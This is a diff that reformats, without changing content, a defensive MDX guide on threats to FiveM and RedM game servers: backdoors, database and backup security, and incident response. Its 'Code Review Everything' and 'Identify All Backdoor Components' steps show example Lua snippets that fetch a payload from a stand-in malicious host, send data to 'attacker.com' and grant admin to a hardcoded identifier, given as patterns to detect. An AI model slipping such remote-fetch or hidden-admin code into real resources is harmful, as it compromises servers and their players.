@@ -3,7 +3,15 @@ title: Common Threats
 description: Comprehensive guide to malicious users, backdoors, and attacks targeting FiveM and RedM servers. Learn how to identify, prevent, and remediate security threats.
 ---
 
-import { TroubleshootingCard, StepList, InfoBanner, DefinitionList, ActionTable, CheckList, CategoryGrid } from '@ui/components/mdx-components'
+import {
+  TroubleshootingCard,
+  StepList,
+  InfoBanner,
+  DefinitionList,
+  ActionTable,
+  CheckList,
+  CategoryGrid,
+} from "@ui/components/mdx-components";
 
 ## Introduction
 
@@ -79,25 +87,30 @@ Finding malicious code before it compromises your server requires vigilance and 
   steps={[
     {
       title: "Code Review Everything",
-      description: "Before deploying any resource, read the code. Yes, all of it. This is tedious but necessary. Look for suspicious patterns: connecting to external databases, downloading code from remote servers, creating hidden admin accounts, or accessing areas of the code that seem unrelated to the resource's stated purpose.",
-      code: "-- Suspicious: Resource connects to external database\nMySQL.query('INSERT INTO attacker_database.players ...')\n\n-- Suspicious: Resource downloads and executes code\nDownloadString('http://malicious.site/payload.lua')\n\n-- Suspicious: Hidden admin grant\nif GetPlayerIdentifier(source) == 'license:deadbeef' then\n  grantAdmin(source)\nend"
+      description:
+        "Before deploying any resource, read the code. Yes, all of it. This is tedious but necessary. Look for suspicious patterns: connecting to external databases, downloading code from remote servers, creating hidden admin accounts, or accessing areas of the code that seem unrelated to the resource's stated purpose.",
+      code: "-- Suspicious: Resource connects to external database\nMySQL.query('INSERT INTO attacker_database.players ...')\n\n-- Suspicious: Resource downloads and executes code\nDownloadString('http://malicious.site/payload.lua')\n\n-- Suspicious: Hidden admin grant\nif GetPlayerIdentifier(source) == 'license:deadbeef' then\n  grantAdmin(source)\nend",
     },
     {
       title: "Verify Source Authenticity",
-      description: "If obtaining a resource from a developer or marketplace, verify it comes from the claimed source. Check GitHub commits, contact the developer directly, and verify PGP signatures if provided. A resource claiming to be from a well-known developer but hosted on an obscure link should raise red flags.",
+      description:
+        "If obtaining a resource from a developer or marketplace, verify it comes from the claimed source. Check GitHub commits, contact the developer directly, and verify PGP signatures if provided. A resource claiming to be from a well-known developer but hosted on an obscure link should raise red flags.",
     },
     {
       title: "Monitor for Unexpected Network Activity",
-      description: "Use network monitoring tools to see what your server is communicating with. Establish a baseline of normal traffic (CDN requests, API calls to expected services) then look for anomalies. A resource connecting to IP addresses in suspicious geographies or communicating on unusual ports deserves investigation.",
+      description:
+        "Use network monitoring tools to see what your server is communicating with. Establish a baseline of normal traffic (CDN requests, API calls to expected services) then look for anomalies. A resource connecting to IP addresses in suspicious geographies or communicating on unusual ports deserves investigation.",
     },
     {
       title: "Check Resource Permissions and Capabilities",
-      description: "FiveM allows resources to declare what capabilities they need. Review the fxmanifest.lua file and understand what permissions each resource requests. A player cosmetics resource shouldn't need database access. A whitelist manager shouldn't need to download external code.",
-      code: "-- fxmanifest.lua\nfx_version 'cerulean'\ngame 'gta5'\n\nauthor 'Developer'\ndescription 'Example Resource'\nversion '1.0.0'\n\nserver_scripts {\n    'server/main.lua'\n}\n\ndependencies {\n    'mysql-async'\n}\n\nprovide_account_balance = true  -- What is this resource accessing?"
+      description:
+        "FiveM allows resources to declare what capabilities they need. Review the fxmanifest.lua file and understand what permissions each resource requests. A player cosmetics resource shouldn't need database access. A whitelist manager shouldn't need to download external code.",
+      code: "-- fxmanifest.lua\nfx_version 'cerulean'\ngame 'gta5'\n\nauthor 'Developer'\ndescription 'Example Resource'\nversion '1.0.0'\n\nserver_scripts {\n    'server/main.lua'\n}\n\ndependencies {\n    'mysql-async'\n}\n\nprovide_account_balance = true  -- What is this resource accessing?",
     },
     {
       title: "Keep Resources Updated",
-      description: "Maintain an inventory of every resource on your server and track their versions. When updates are available, review the changelog before updating. If a resource suddenly pushes a major update, investigate why. Legitimate updates typically have documented reasons.",
+      description:
+        "Maintain an inventory of every resource on your server and track their versions. When updates are available, review the changelog before updating. If a resource suddenly pushes a major update, investigate why. Legitimate updates typically have documented reasons.",
     },
   ]}
 />
@@ -112,28 +125,34 @@ A backdoor is a hidden entry point into your server that allows an attacker to m
   items={[
     {
       term: "Database Backdoors",
-      description: "The attacker creates database accounts with non-obvious names (like 'backup_user' or 'maintenance_service') with strong passwords only they know. Even if you update your main database password, this account remains. They can access, modify, or exfiltrate data at will. Detection requires auditing all database accounts and their access logs."
+      description:
+        "The attacker creates database accounts with non-obvious names (like 'backup_user' or 'maintenance_service') with strong passwords only they know. Even if you update your main database password, this account remains. They can access, modify, or exfiltrate data at will. Detection requires auditing all database accounts and their access logs.",
     },
     {
       term: "File System Backdoors",
-      description: "The attacker places files in obscure locations that auto-execute when the server starts. A file named something innocuous in a resource's data folder that runs initialization code. A modified startup script that loads additional resources before the normal startup sequence. These survive resource updates because they exist outside the resource directories."
+      description:
+        "The attacker places files in obscure locations that auto-execute when the server starts. A file named something innocuous in a resource's data folder that runs initialization code. A modified startup script that loads additional resources before the normal startup sequence. These survive resource updates because they exist outside the resource directories.",
     },
     {
       term: "Resource Backdoors",
-      description: "A malicious resource is packaged with your legitimate resources. It might be named something that suggests it's part of the framework (like 'core-utilities' or 'framework-extension') making admins assume it's supposed to be there. The resource only activates under certain conditions (specific times, specific player IDs, or specific commands) so it doesn't trigger alarms during normal use."
+      description:
+        "A malicious resource is packaged with your legitimate resources. It might be named something that suggests it's part of the framework (like 'core-utilities' or 'framework-extension') making admins assume it's supposed to be there. The resource only activates under certain conditions (specific times, specific player IDs, or specific commands) so it doesn't trigger alarms during normal use.",
     },
     {
       term: "Admin Account Backdoors",
-      description: "Hidden admin accounts are created with non-obvious identifiers. A Discord ID of an admin that seems high and random. A Steam ID that appears to be from nowhere. These accounts have full admin permissions but don't appear in normal admin listings because they're added through database manipulation rather than admin configuration files."
+      description:
+        "Hidden admin accounts are created with non-obvious identifiers. A Discord ID of an admin that seems high and random. A Steam ID that appears to be from nowhere. These accounts have full admin permissions but don't appear in normal admin listings because they're added through database manipulation rather than admin configuration files.",
     },
     {
       term: "Reverse Shell Backdoors",
-      description: "The attacker establishes an outbound connection from your server to their machine, giving them remote command execution. This is particularly dangerous on Windows servers where the attacker could execute PowerShell commands or on Linux servers where they could execute bash. The connection often uses encrypted channels (SSH tunnels or encrypted HTTP) to avoid detection."
+      description:
+        "The attacker establishes an outbound connection from your server to their machine, giving them remote command execution. This is particularly dangerous on Windows servers where the attacker could execute PowerShell commands or on Linux servers where they could execute bash. The connection often uses encrypted channels (SSH tunnels or encrypted HTTP) to avoid detection.",
     },
     {
       term: "Update Backdoors",
-      description: "A malicious update to a resource is distributed. If your server auto-updates resources, the backdoor is installed automatically. Even if you don't auto-update, an admin downloading the latest version could install the compromised code without realizing it."
-    }
+      description:
+        "A malicious update to a resource is distributed. If your server auto-updates resources, the backdoor is installed automatically. Even if you don't auto-update, an admin downloading the latest version could install the compromised code without realizing it.",
+    },
   ]}
 />
 
@@ -151,7 +170,7 @@ Backdoor detection requires multiple approaches since no single method catches e
     "Review all admin accounts in your database and verify each one corresponds to a real administrator",
     "Check outbound connections using netstat or similar tools. Establish a baseline of normal traffic",
     "Enable and review database query logs. Look for queries from accounts you don't recognize",
-    "Run file integrity checks. Tools like AIDE (Linux) or Windows File Integrity Monitoring can detect unauthorized changes"
+    "Run file integrity checks. Tools like AIDE (Linux) or Windows File Integrity Monitoring can detect unauthorized changes",
   ]}
 />
 
@@ -163,33 +182,40 @@ Once you've identified a backdoor, thorough removal is critical because backdoor
   steps={[
     {
       title: "Isolate the Server",
-      description: "Take your server offline or restrict access while you investigate. Backdoors are often designed to alert the attacker when they're discovered. By going offline, you reduce the risk of the attacker noticing and establishing another backdoor. Restrict network access from the server to the internet if possible."
+      description:
+        "Take your server offline or restrict access while you investigate. Backdoors are often designed to alert the attacker when they're discovered. By going offline, you reduce the risk of the attacker noticing and establishing another backdoor. Restrict network access from the server to the internet if possible.",
     },
     {
       title: "Identify All Backdoor Components",
-      description: "Don't just remove one suspicious resource or file. Backdoors are typically multi-layered. A single malicious resource might create database accounts, add hidden admin users, and place files in multiple locations. Finding one component should trigger a comprehensive search for others.",
-      code: "-- Common backdoor patterns to search for:\n-- Hidden identifiers that grant permissions\nif identifier == 'hidden-admin-identifier' then\n  grantAdmin(source)\nend\n\n-- External communication\nHttpsRequest({url = 'http://attacker.com/...'})\n\n-- Resource restart immunity\nAddEventHandler('onServerResourceStart', function()\n  -- Persistence code\nend)"
+      description:
+        "Don't just remove one suspicious resource or file. Backdoors are typically multi-layered. A single malicious resource might create database accounts, add hidden admin users, and place files in multiple locations. Finding one component should trigger a comprehensive search for others.",
+      code: "-- Common backdoor patterns to search for:\n-- Hidden identifiers that grant permissions\nif identifier == 'hidden-admin-identifier' then\n  grantAdmin(source)\nend\n\n-- External communication\nHttpsRequest({url = 'http://attacker.com/...'})\n\n-- Resource restart immunity\nAddEventHandler('onServerResourceStart', function()\n  -- Persistence code\nend)",
     },
     {
       title: "Remove the Backdoor",
-      description: "Delete malicious resources, drop compromised database accounts, delete unauthorized files, and remove hidden admin accounts. Don't just disable them. Completely remove them. A disabled account can be re-enabled."
+      description:
+        "Delete malicious resources, drop compromised database accounts, delete unauthorized files, and remove hidden admin accounts. Don't just disable them. Completely remove them. A disabled account can be re-enabled.",
     },
     {
       title: "Change All Credentials",
-      description: "Change database passwords, admin account passwords, credentials for external services, and any SSH keys if your infrastructure was compromised. Assume the attacker has copied any credentials they could access."
+      description:
+        "Change database passwords, admin account passwords, credentials for external services, and any SSH keys if your infrastructure was compromised. Assume the attacker has copied any credentials they could access.",
     },
     {
       title: "Restore from Backup",
-      description: "If you have a clean backup from before the compromise, restore your entire server from it. This is the most reliable way to ensure the backdoor is gone. However, you need to ensure your backup itself isn't compromised. Check backup dates and verify they're from before you believe the compromise occurred.",
+      description:
+        "If you have a clean backup from before the compromise, restore your entire server from it. This is the most reliable way to ensure the backdoor is gone. However, you need to ensure your backup itself isn't compromised. Check backup dates and verify they're from before you believe the compromise occurred.",
       alert: {
         type: "warning",
-        message: "Backup restoration is only effective if the backup was taken before the compromise. If the attacker had access for months but you only recently discovered it, all your recent backups might be compromised. Maintain long-term retention of older backups."
-      }
+        message:
+          "Backup restoration is only effective if the backup was taken before the compromise. If the attacker had access for months but you only recently discovered it, all your recent backups might be compromised. Maintain long-term retention of older backups.",
+      },
     },
     {
       title: "Audit Everything",
-      description: "After removal, audit your entire infrastructure. Review code changes, commit histories, and deployment logs. Look for any other suspicious activity. A backdoor is rarely the only attack. The attacker typically begins with reconnaissance and may have established other access methods."
-    }
+      description:
+        "After removal, audit your entire infrastructure. Review code changes, commit histories, and deployment logs. Look for any other suspicious activity. A backdoor is rarely the only attack. The attacker typically begins with reconnaissance and may have established other access methods.",
+    },
   ]}
 />
 
@@ -227,43 +253,51 @@ Database credentials stored in resource code, configuration files, or commit his
     {
       action: "Use Strong Credentials",
       permission: "required",
-      description: "Database usernames and passwords should be strong, unique, and rotated regularly. Use a password manager to generate and store them."
+      description:
+        "Database usernames and passwords should be strong, unique, and rotated regularly. Use a password manager to generate and store them.",
     },
     {
       action: "Restrict Database Access",
       permission: "required",
-      description: "Limit database access to only your application server. Use firewall rules to block direct internet access. Consider network-level isolation using VPCs or private networks."
+      description:
+        "Limit database access to only your application server. Use firewall rules to block direct internet access. Consider network-level isolation using VPCs or private networks.",
     },
     {
       action: "Enforce Encrypted Connections",
       permission: "required",
-      description: "Require SSL/TLS for all database connections. Configure your database server to reject unencrypted connections."
+      description:
+        "Require SSL/TLS for all database connections. Configure your database server to reject unencrypted connections.",
     },
     {
       action: "Use Parameterized Queries",
       permission: "required",
-      description: "Always use parameterized queries or prepared statements. Never construct queries by concatenating strings with user input."
+      description:
+        "Always use parameterized queries or prepared statements. Never construct queries by concatenating strings with user input.",
     },
     {
       action: "Implement Principle of Least Privilege",
       permission: "required",
-      description: "Database accounts should have only the permissions they need. Don't use a single account with full permissions for everything. Create limited accounts for different functions."
+      description:
+        "Database accounts should have only the permissions they need. Don't use a single account with full permissions for everything. Create limited accounts for different functions.",
     },
     {
       action: "Monitor Database Activity",
       permission: "required",
-      description: "Enable database logging and monitor for suspicious queries, failed authentication attempts, and unusual access patterns."
+      description:
+        "Enable database logging and monitor for suspicious queries, failed authentication attempts, and unusual access patterns.",
     },
     {
       action: "Regular Security Audits",
       permission: "recommended",
-      description: "Periodically audit your database for unauthorized accounts, unusual privileges, and suspicious modifications."
+      description:
+        "Periodically audit your database for unauthorized accounts, unusual privileges, and suspicious modifications.",
     },
     {
       action: "Keep Database Software Updated",
       permission: "required",
-      description: "Apply security patches promptly. Unpatched databases are vulnerable to known exploits."
-    }
+      description:
+        "Apply security patches promptly. Unpatched databases are vulnerable to known exploits.",
+    },
   ]}
 />
 
@@ -301,29 +335,35 @@ Treat backups with the same security standards as your live database, or perhaps
   steps={[
     {
       title: "Encrypt Backups",
-      description: "Encrypt backups at rest using strong encryption (AES-256 or better). Encrypt them in transit using TLS. The encryption key should be stored separately from the backups."
+      description:
+        "Encrypt backups at rest using strong encryption (AES-256 or better). Encrypt them in transit using TLS. The encryption key should be stored separately from the backups.",
     },
     {
       title: "Restrict Backup Access",
-      description: "Limit who can create, modify, and restore backups. Use separate accounts for backup operations with minimal required permissions. Back up to isolated storage that's not directly accessible from your application server."
+      description:
+        "Limit who can create, modify, and restore backups. Use separate accounts for backup operations with minimal required permissions. Back up to isolated storage that's not directly accessible from your application server.",
     },
     {
       title: "Verify Backup Integrity",
-      description: "Use cryptographic checksums or signatures to verify that backups haven't been modified. Create a checksum when the backup is made and verify it before restoration.",
-      code: "-- Example: Creating a backup checksum\nsha256sum database_backup.sql > database_backup.sql.sha256\n\n-- Verifying before restoration\nsha256sum -c database_backup.sql.sha256"
+      description:
+        "Use cryptographic checksums or signatures to verify that backups haven't been modified. Create a checksum when the backup is made and verify it before restoration.",
+      code: "-- Example: Creating a backup checksum\nsha256sum database_backup.sql > database_backup.sql.sha256\n\n-- Verifying before restoration\nsha256sum -c database_backup.sql.sha256",
     },
     {
       title: "Maintain Historical Backups",
-      description: "Keep multiple versions of backups spanning a long timeframe. If your server was compromised months ago but you only recently discovered it, you need a backup from before the compromise occurred. Monthly or quarterly backups reaching back years are reasonable."
+      description:
+        "Keep multiple versions of backups spanning a long timeframe. If your server was compromised months ago but you only recently discovered it, you need a backup from before the compromise occurred. Monthly or quarterly backups reaching back years are reasonable.",
     },
     {
       title: "Test Restoration Procedures",
-      description: "Regularly test restoring from backups in a non-production environment. This ensures backups are functional and gives you experience with the restoration process before you desperately need it."
+      description:
+        "Regularly test restoring from backups in a non-production environment. This ensures backups are functional and gives you experience with the restoration process before you desperately need it.",
     },
     {
       title: "Automate Backup Creation",
-      description: "Use automated backup tools rather than manual backup creation. Automation is more reliable and less prone to mistakes. Schedule regular automated backups and verify they're completing successfully."
-    }
+      description:
+        "Use automated backup tools rather than manual backup creation. Automation is more reliable and less prone to mistakes. Schedule regular automated backups and verify they're completing successfully.",
+    },
   ]}
 />
 
@@ -355,7 +395,7 @@ A lower-privileged user might exploit vulnerabilities in your admin system to el
     "Regularly rotate admin credentials and review admin account access. Remove admins who are no longer active",
     "Monitor for unusual admin activity (commands at strange times, mass bans, excessive economic changes). Investigate anomalies",
     "Implement rate limiting on admin commands to prevent automated attacks. An attacker shouldn't be able to ban 1000 players in one second",
-    "Use application-level admin systems rather than relying solely on database permissions. Your database permissions and your application permissions are independent layers"
+    "Use application-level admin systems rather than relying solely on database permissions. Your database permissions and your application permissions are independent layers",
   ]}
 />
 
@@ -403,24 +443,29 @@ Early detection of compromise reduces the damage. Quick response contains the at
   items={[
     {
       term: "Behavior Analysis",
-      description: "Establish a baseline of normal server behavior and player activity. Sudden changes might indicate compromise: unusual admin activity, unexpected resource restarts, players being banned without reason, or players having permissions they shouldn't have."
+      description:
+        "Establish a baseline of normal server behavior and player activity. Sudden changes might indicate compromise: unusual admin activity, unexpected resource restarts, players being banned without reason, or players having permissions they shouldn't have.",
     },
     {
       term: "Log Analysis",
-      description: "Review server logs, application logs, and system logs regularly. Look for unusual patterns, failed authentication attempts, unexpected errors, or suspicious activity. Automated log analysis tools can alert you to anomalies."
+      description:
+        "Review server logs, application logs, and system logs regularly. Look for unusual patterns, failed authentication attempts, unexpected errors, or suspicious activity. Automated log analysis tools can alert you to anomalies.",
     },
     {
       term: "Network Monitoring",
-      description: "Monitor network traffic to and from your server. Unusual outbound connections, traffic to suspicious IP addresses, or encrypted traffic from resources that shouldn't be encrypting data are red flags."
+      description:
+        "Monitor network traffic to and from your server. Unusual outbound connections, traffic to suspicious IP addresses, or encrypted traffic from resources that shouldn't be encrypting data are red flags.",
     },
     {
       term: "File Integrity Monitoring",
-      description: "Tools like AIDE (Advanced Intrusion Detection Environment) on Linux or Windows File Integrity Monitoring can alert you when files are modified unexpectedly. A sudden change to a critical resource file indicates potential compromise."
+      description:
+        "Tools like AIDE (Advanced Intrusion Detection Environment) on Linux or Windows File Integrity Monitoring can alert you when files are modified unexpectedly. A sudden change to a critical resource file indicates potential compromise.",
     },
     {
       term: "Performance Monitoring",
-      description: "Unexpected performance degradation, CPU spikes, or memory usage increases might indicate malicious activity or resource exhaustion attacks."
-    }
+      description:
+        "Unexpected performance degradation, CPU spikes, or memory usage increases might indicate malicious activity or resource exhaustion attacks.",
+    },
   ]}
 />
 
@@ -430,32 +475,39 @@ Early detection of compromise reduces the damage. Quick response contains the at
   steps={[
     {
       title: "Confirm the Compromise",
-      description: "Before taking drastic action, confirm you actually have a security issue. False alarms lead to unnecessary downtime. Gather evidence and have multiple people review it."
+      description:
+        "Before taking drastic action, confirm you actually have a security issue. False alarms lead to unnecessary downtime. Gather evidence and have multiple people review it.",
     },
     {
       title: "Isolate the Server",
-      description: "Take the server offline or restrict access. This prevents the attacker from causing further damage or establishing additional backdoors. It also prevents them from being alerted that you've discovered the compromise."
+      description:
+        "Take the server offline or restrict access. This prevents the attacker from causing further damage or establishing additional backdoors. It also prevents them from being alerted that you've discovered the compromise.",
     },
     {
       title: "Preserve Evidence",
-      description: "Before making changes, capture logs, memory dumps, and file system state. This evidence is needed for investigation and potential law enforcement involvement."
+      description:
+        "Before making changes, capture logs, memory dumps, and file system state. This evidence is needed for investigation and potential law enforcement involvement.",
     },
     {
       title: "Eradicate the Threat",
-      description: "Remove the compromise: delete malicious resources, drop unauthorized accounts, delete backdoor files, and change all credentials. Refer to the detailed removal steps earlier in this guide."
+      description:
+        "Remove the compromise: delete malicious resources, drop unauthorized accounts, delete backdoor files, and change all credentials. Refer to the detailed removal steps earlier in this guide.",
     },
     {
       title: "Recover to a Known Good State",
-      description: "Restore from a clean backup if available, rebuild from scratch if necessary, or deploy a new server from a known good image. Ensure the recovered state doesn't include the compromise."
+      description:
+        "Restore from a clean backup if available, rebuild from scratch if necessary, or deploy a new server from a known good image. Ensure the recovered state doesn't include the compromise.",
     },
     {
       title: "Hardening",
-      description: "After recovery, implement additional security measures to prevent recurrence. Review what allowed the initial compromise and fix it."
+      description:
+        "After recovery, implement additional security measures to prevent recurrence. Review what allowed the initial compromise and fix it.",
     },
     {
       title: "Communicate",
-      description: "Decide how much to communicate to players about the incident. Transparency builds trust, but you might not want to publicly announce security flaws. At minimum, change any compromised player data (reset passwords, audit account changes)."
-    }
+      description:
+        "Decide how much to communicate to players about the incident. Transparency builds trust, but you might not want to publicly announce security flaws. At minimum, change any compromised player data (reset passwords, audit account changes).",
+    },
   ]}
 />
 
@@ -470,33 +522,39 @@ Prevention is better than response. Harden your server against the attacks descr
     {
       name: "Code Security",
       icon: "code",
-      description: "Review all custom resources, audit third-party resources, and keep dependencies updated"
+      description:
+        "Review all custom resources, audit third-party resources, and keep dependencies updated",
     },
     {
       name: "Database Security",
       icon: "database",
-      description: "Use strong credentials, restrict access, encrypt connections, and implement parameterized queries"
+      description:
+        "Use strong credentials, restrict access, encrypt connections, and implement parameterized queries",
     },
     {
       name: "Access Control",
       icon: "shield",
-      description: "Implement MFA, use least privilege, separate admin tiers, and audit admin actions"
+      description:
+        "Implement MFA, use least privilege, separate admin tiers, and audit admin actions",
     },
     {
       name: "Backup Strategy",
       icon: "server",
-      description: "Encrypt backups, restrict access, maintain historical versions, and test restoration regularly"
+      description:
+        "Encrypt backups, restrict access, maintain historical versions, and test restoration regularly",
     },
     {
       name: "Monitoring",
       icon: "activity",
-      description: "Monitor resources, logs, network activity, and file integrity. Alert on anomalies"
+      description:
+        "Monitor resources, logs, network activity, and file integrity. Alert on anomalies",
     },
     {
       name: "Incident Response",
       icon: "alert-triangle",
-      description: "Have a plan for detecting and responding to compromise. Test it regularly"
-    }
+      description:
+        "Have a plan for detecting and responding to compromise. Test it regularly",
+    },
   ]}
 />
 
